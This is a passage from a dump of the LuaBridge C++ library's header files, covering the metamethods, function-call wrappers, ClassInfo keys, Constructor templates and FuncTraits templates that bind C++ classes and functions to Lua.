        Retrieving functions and class static methods, stored in the metatable.
        Reading global and class static data, stored in the __propget table.
        Reading global and class properties, stored in the __propget table.
  */
  static int indexMetaMethod (lua_State* L)
  {
    int result = 0;
    lua_getmetatable (L, 1);                // push metatable of arg1
    for (;;)
    {
      lua_pushvalue (L, 2);                 // push key arg2
      lua_rawget (L, -2);                   // lookup key in metatable
      if (lua_isnil (L, -1))                // not found
      {
        lua_pop (L, 1);                     // discard nil
        rawgetfield (L, -1, "__propget");   // lookup __propget in metatable
        lua_pushvalue (L, 2);               // push key arg2
        lua_rawget (L, -2);                 // lookup key in __propget
        lua_remove (L, -2);                 // discard __propget
        if (lua_iscfunction (L, -1))
        {
          lua_remove (L, -2);               // discard metatable
          lua_pushvalue (L, 1);             // push arg1
          lua_call (L, 1, 1);               // call cfunction
          result = 1;
          break;
        }
        else
        {
          assert (lua_isnil (L, -1));
          lua_pop (L, 1);                   // discard nil and fall through
        }
      }
      else
      {
        assert (lua_istable (L, -1) || lua_iscfunction (L, -1));
        lua_remove (L, -2);
        result = 1;
        break;
      }

      rawgetfield (L, -1, "__parent");
      if (lua_istable (L, -1))
      {
        // Remove metatable and repeat the search in __parent.
        lua_remove (L, -2);
      }
      else
      {
        // Discard metatable and return nil.
        assert (lua_isnil (L, -1));
        lua_remove (L, -2);
        result = 1;
        break;
      }
    }

    return result;
  }

  //----------------------------------------------------------------------------
  /**
      __newindex metamethod for a namespace or class static members.

      The __propset table stores proxy functions for assignment to:
        Global and class static data.
        Global and class properties.
  */
  static int newindexMetaMethod (lua_State* L)
  {
    int result = 0;
    lua_getmetatable (L, 1);                // push metatable of arg1
    for (;;)
    {
      rawgetfield (L, -1, "__propset");     // lookup __propset in metatable
      assert (lua_istable (L, -1));
      lua_pushvalue (L, 2);                 // push key arg2
      lua_rawget (L, -2);                   // lookup key in __propset
      lua_remove (L, -2);                   // discard __propset
      if (lua_iscfunction (L, -1))          // ensure value is a cfunction
      {
        lua_remove (L, -2);                 // discard metatable
        lua_pushvalue (L, 3);               // push new value arg3
        lua_call (L, 1, 0);                 // call cfunction
        result = 0;
        break;
      }
      else
      {
        assert (lua_isnil (L, -1));
        lua_pop (L, 1);
      }

      rawgetfield (L, -1, "__parent");
      if (lua_istable (L, -1))
      {
        // Remove metatable and repeat the search in __parent.
        lua_remove (L, -2);
      }
      else
      {
        assert (lua_isnil (L, -1));
        lua_pop (L, 2);
        result = luaL_error (L,"no writable variable '%s'", lua_tostring (L, 2));
      }
    }

    return result;
  }

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to report an error writing to a read-only value.

      The name of the variable is in the first upvalue.
  */
  static int readOnlyError (lua_State* L)
  {
    std::string s;
    
    s = s + "'" + lua_tostring (L, lua_upvalueindex (1)) + "' is read-only";

    return luaL_error (L, s.c_str ());
  }
  
  //----------------------------------------------------------------------------
  /**
      lua_CFunction to get a variable.

      This is used for global variables or class static data members.

      The pointer to the data is in the first upvalue.
  */
  template <class T>
  static int getVariable (lua_State* L)
  {
    assert (lua_islightuserdata (L, lua_upvalueindex (1)));
    T const* ptr = static_cast <T const*> (lua_touserdata (L, lua_upvalueindex (1)));
    assert (ptr != 0);
    Stack <T>::push (L, *ptr);
    return 1;
  }

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to set a variable.

      This is used for global variables or class static data members.

      The pointer to the data is in the first upvalue.
  */
  template <class T>
  static int setVariable (lua_State* L)
  {
    assert (lua_islightuserdata (L, lua_upvalueindex (1)));
    T* ptr = static_cast <T*> (lua_touserdata (L, lua_upvalueindex (1)));
    assert (ptr != 0);
    *ptr = Stack <T>::get (L, 1);
    return 0;
  }

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to call a function with a return value.

      This is used for global functions, global properties, class static methods,
      and class static properties.

      The function pointer is in the first upvalue.
  */
  template <class FnPtr,
            class ReturnType = typename FuncTraits <FnPtr>::ReturnType>
  struct Call
  {
    typedef typename FuncTraits <FnPtr>::Params Params;
    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      FnPtr const& fnptr = *static_cast <FnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params> args (L);
      Stack <typename FuncTraits <FnPtr>::ReturnType>::push (L, FuncTraits <FnPtr>::call (fnptr, args));
      return 1;
    }
  };

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to call a function with no return value.

      This is used for global functions, global properties, class static methods,
      and class static properties.

      The function pointer is in the first upvalue.
  */
  template <class FnPtr>
  struct Call <FnPtr, void>
  {
    typedef typename FuncTraits <FnPtr>::Params Params;
    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      FnPtr const& fnptr = *static_cast <FnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params> args (L);
      FuncTraits <FnPtr>::call (fnptr, args);
      return 0;
    }
  };

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to call a class member function with a return value.

      The member function pointer is in the first upvalue.
      The class userdata object is at the top of the Lua stack.
  */
  template <class MemFnPtr,
            class ReturnType = typename FuncTraits <MemFnPtr>::ReturnType>
  struct CallMember
  {
    typedef typename FuncTraits <MemFnPtr>::ClassType T;
    typedef typename FuncTraits <MemFnPtr>::Params Params;

    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      T* const t = Userdata::get <T> (L, 1, false);
      MemFnPtr const& fnptr = *static_cast <MemFnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params, 2> args (L);
      Stack <ReturnType>::push (L, FuncTraits <MemFnPtr>::call (t, fnptr, args));
      return 1;
    }
  };

  template <class MemFnPtr,
            class ReturnType = typename FuncTraits <MemFnPtr>::ReturnType>
  struct CallConstMember
  {
    typedef typename FuncTraits <MemFnPtr>::ClassType T;
    typedef typename FuncTraits <MemFnPtr>::Params Params;

    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      T const* const t = Userdata::get <T> (L, 1, true);
      MemFnPtr const& fnptr = *static_cast <MemFnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params, 2> args(L);
      Stack <ReturnType>::push (L, FuncTraits <MemFnPtr>::call (t, fnptr, args));
      return 1;
    }
  };

  //----------------------------------------------------------------------------
  /**
      lua_CFunction to call a class member function with no return value.

      The member function pointer is in the first upvalue.
      The class userdata object is at the top of the Lua stack.
  */
  template <class MemFnPtr>
  struct CallMember <MemFnPtr, void>
  {
    typedef typename FuncTraits <MemFnPtr>::ClassType T;
    typedef typename FuncTraits <MemFnPtr>::Params Params;

    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      T* const t = Userdata::get <T> (L, 1, false);
      MemFnPtr const& fnptr = *static_cast <MemFnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params, 2> args (L);
      FuncTraits <MemFnPtr>::call (t, fnptr, args);
      return 0;
    }
  };

  template <class MemFnPtr>
  struct CallConstMember <MemFnPtr, void>
  {
    typedef typename FuncTraits <MemFnPtr>::ClassType T;
    typedef typename FuncTraits <MemFnPtr>::Params Params;

    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      T const* const t = Userdata::get <T> (L, 1, true);
      MemFnPtr const& fnptr = *static_cast <MemFnPtr const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      ArgList <Params, 2> args (L);
      FuncTraits <MemFnPtr>::call (t, fnptr, args);
      return 0;
    }
  };

  //--------------------------------------------------------------------------
  /**
      lua_CFunction to call a class member lua_CFunction.

      The member function pointer is in the first upvalue.
      The class userdata object is at the top of the Lua stack.
  */
  template <class T>
  struct CallMemberCFunction
  {
    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      typedef int (T::*MFP)(lua_State* L);
      T* const t = Userdata::get <T> (L, 1, false);
      MFP const& fnptr = *static_cast <MFP const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      return (t->*fnptr) (L);
    }
  };

  template <class T>
  struct CallConstMemberCFunction
  {
    static int f (lua_State* L)
    {
      assert (isfulluserdata (L, lua_upvalueindex (1)));
      typedef int (T::*MFP)(lua_State* L);
      T const* const t = Userdata::get <T> (L, 1, true);
      MFP const& fnptr = *static_cast <MFP const*> (lua_touserdata (L, lua_upvalueindex (1)));
      assert (fnptr != 0);
      return (t->*fnptr) (L);
    }
  };

  //--------------------------------------------------------------------------

  // SFINAE Helpers

  template <class MemFnPtr, bool isConst>
  struct CallMemberFunctionHelper
  {
    static void add (lua_State* L, char const* name, MemFnPtr mf)
    {
      new (lua_newuserdata (L, sizeof (MemFnPtr))) MemFnPtr (mf);
      lua_pushcclosure (L, &CallConstMember <MemFnPtr>::f, 1);
      lua_pushvalue (L, -1);
      rawsetfield (L, -5, name); // const table
      rawsetfield (L, -3, name); // class table
    }
  };

  template <class MemFnPtr>
  struct CallMemberFunctionHelper <MemFnPtr, false>
  {
    static void add (lua_State* L, char const* name, MemFnPtr mf)
    {
      new (lua_newuserdata (L, sizeof (MemFnPtr))) MemFnPtr (mf);
      lua_pushcclosure (L, &CallMember <MemFnPtr>::f, 1);
      rawsetfield (L, -3, name); // class table
    }
  };

  //--------------------------------------------------------------------------
  /**
      __gc metamethod for a class.
  */
  template <class C>
  static int gcMetaMethod (lua_State* L)
  {
    Userdata* const ud = Userdata::getExact <C> (L, 1);
    ud->~Userdata ();
    return 0;
  }

  //--------------------------------------------------------------------------
  /**
      lua_CFunction to get a class data member.

      The pointer-to-member is in the first upvalue.
      The class userdata object is at the top of the Lua stack.
  */
  template <class C, typename T>
  static int getProperty (lua_State* L)
  {
    C const* const c = Userdata::get <C> (L, 1, true);
    T C::** mp = static_cast <T C::**> (lua_touserdata (L, lua_upvalueindex (1)));
    Stack <T>::push (L, c->**mp);
    return 1;
  }

  //--------------------------------------------------------------------------
  /**
      lua_CFunction to set a class data member.

      The pointer-to-member is in the first upvalue.
      The class userdata object is at the top of the Lua stack.
  */
  template <class C, typename T>
  static int setProperty (lua_State* L)
  {
    C* const c = Userdata::get <C> (L, 1, false);
    T C::** mp = static_cast <T C::**> (lua_touserdata (L, lua_upvalueindex (1)));
    c->**mp = Stack <T>::get (L, 2);
    return 0;
  }
};

```

`libs/LuaBridge/detail/ClassInfo.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

/** Unique Lua registry keys for a class.

    Each registered class inserts three keys into the registry, whose
    values are the corresponding static, class, and const metatables. This
    allows a quick and reliable lookup for a metatable from a template type.
*/
template <class T>
class ClassInfo
{
public:
  /** Get the key for the static table.

      The static table holds the static data members, static properties, and
      static member functions for a class.
  */
  static void const* getStaticKey ()
  {
    static char value;
    return &value;
  }

  /** Get the key for the class table.

      The class table holds the data members, properties, and member functions
      of a class. Read-only data and properties, and const member functions are
      also placed here (to save a lookup in the const table).
  */
  static void const* getClassKey ()
  {
    static char value;
    return &value;
  }

  /** Get the key for the const table.

      The const table holds read-only data members and properties, and const
      member functions of a class.
  */
  static void const* getConstKey ()
  {
    static char value;
    return &value;
  }
};


```

`libs/LuaBridge/detail/Constructor.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

#ifndef LUABRIDGE_CONSTRUCTOR_HEADER
#define LUABRIDGE_CONSTRUCTOR_HEADER

/*
* Constructor generators.  These templates allow you to call operator new and
* pass the contents of a type/value list to the Constructor.  Like the
* function pointer containers, these are only defined up to 8 parameters.
*/

/** Constructor generators.

    These templates call operator new with the contents of a type/value
    list passed to the Constructor with up to 8 parameters. Two versions
    of call() are provided. One performs a regular new, the other performs
    a placement new.
*/
template <class T, typename List>
struct Constructor {};

template <class T>
struct Constructor <T, None>
{
  static T* call (TypeListValues <None> const&)
  {
    return new T;
  }
  static T* call (void* mem, TypeListValues <None> const&)
  {
    return new (mem) T;
  }
};

template <class T, class P1>
struct Constructor <T, TypeList <P1> >
{
  static T* call (const TypeListValues<TypeList <P1> > &tvl)
  {
    return new T(tvl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1> > &tvl)
  {
    return new (mem) T(tvl.hd);
  }
};

template <class T, class P1, class P2>
struct Constructor <T, TypeList <P1, TypeList <P2> > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2> > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2> > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3> > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3> > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3> > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3, class P4>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3,
  TypeList <P4> > > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4> > > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4> > > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3, class P4,
  class P5>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3,
  TypeList <P4, TypeList <P5> > > > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5> > > > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5> > > > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3, class P4,
  class P5, class P6>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3,
  TypeList <P4, TypeList <P5, TypeList <P6> > > > > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3, class P4,
  class P5, class P6, class P7>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3,
  TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6,
    TypeList <P7> > > > > > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6,
    TypeList <P7> > > > > > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class P1, class P2, class P3, class P4,
  class P5, class P6, class P7, class P8>
struct Constructor <T, TypeList <P1, TypeList <P2, TypeList <P3,
  TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, 
  TypeList <P8> > > > > > > > >
{
  static T* call (const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6,
    TypeList <P7, TypeList <P8> > > > > > > > > &tvl)
  {
    return new T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
  static T* call (void* mem, const TypeListValues<TypeList <P1, TypeList <P2,
    TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6,
    TypeList <P7, TypeList <P8> > > > > > > > > &tvl)
  {
    return new (mem) T(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

#endif

```

`libs/LuaBridge/detail/FuncTraits.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

/**
  Since the throw specification is part of a function signature, the FuncTraits
  family of templates needs to be specialized for both types. The
  LUABRIDGE_THROWSPEC macro controls whether we use the 'throw ()' form, or
  'noexcept' (if C++11 is available) to distinguish the functions.
*/
#if defined (__APPLE_CPP__) || defined(__APPLE_CC__) || defined(__clang__) || defined(__GNUC__) || \
    (defined (_MSC_VER) && (_MSC_VER >= 1700))
// Do not define LUABRIDGE_THROWSPEC since the Xcode and gcc  compilers do not
// distinguish the throw specification in the function signature.
#else
// Visual Studio 10 and earlier pay too much mind to useless throw() spec.
//
# define LUABRIDGE_THROWSPEC throw()
#endif

//==============================================================================
/**
    Traits for function pointers.

    There are three types of functions: global, non-const member, and const
    member. These templates determine the type of function, which class type it
    belongs to if it is a class member, the const-ness if it is a member
    function, and the type information for the return value and argument list.

    Expansions are provided for functions with up to 8 parameters. This can be
    manually extended, or expanded to an arbitrary amount using C++11 features.
*/
template <class MemFn, class D = MemFn>
struct FuncTraits
{
};

/* Ordinary function pointers. */

template <class R, class D>
struct FuncTraits <R (*) (), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef None Params;
  static R call (D fp, TypeListValues <Params>)
  {
    return fp ();
  }
};

template <class R, class P1, class D>
struct FuncTraits <R (*) (P1), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd);
  }
};

template <class R, class P1, class P2, class D>
struct FuncTraits <R (*) (P1, P2), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (*) (P1, P2, P3), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5,  TypeList <P6> > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6, P7), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6, P7, P8), D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

/* Non-const member function pointers. */

template <class T, class R, class D>
struct FuncTraits <R (T::*) (), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef None Params;
  static R call (T* obj, D fp, TypeListValues <Params>)
  {
    return (obj->*fp)();
  }
};

template <class T, class R, class P1, class D>
struct FuncTraits <R (T::*) (P1), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd);
  }
};

template <class T, class R, class P1, class P2, class D>
struct FuncTraits <R (T::*) (P1, P2), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (T::*) (P1, P2, P3), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
